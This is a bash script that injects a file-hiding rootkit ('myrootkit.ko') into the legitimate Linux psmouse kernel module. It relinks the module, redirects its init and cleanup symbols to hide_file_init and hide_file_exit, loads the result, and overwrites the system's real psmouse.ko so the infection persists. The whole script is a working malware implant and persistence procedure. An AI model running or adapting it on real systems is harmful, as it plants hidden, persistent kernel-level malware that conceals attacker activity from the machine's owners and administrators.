#!/bin/bash
cp /lib/modules/$(uname -r)/kernel/drivers/input/mouse/psmouse.ko .
objcopy psmouse.ko gpsmouse.ko --globalize-symbol psmouse_init --globalize-symbol psmouse_exit
make --quiet
ld -r gpsmouse.ko myrootkit.ko -o infected.ko 
setsym infected.ko init_module $(setsym infected.ko hide_file_init)
setsym infected.ko cleanup_module $(setsym infected.ko hide_file_exit)
rmmod psmouse
insmod infected.ko
ls -al ./
rmmod psmouse
ls -al ./
cp infected.ko /lib/modules/$(uname -r)/kernel/drivers/input/mouse/psmouse.ko
insmod /lib/modules/$(uname -r)/kernel/drivers/input/mouse/psmouse.ko
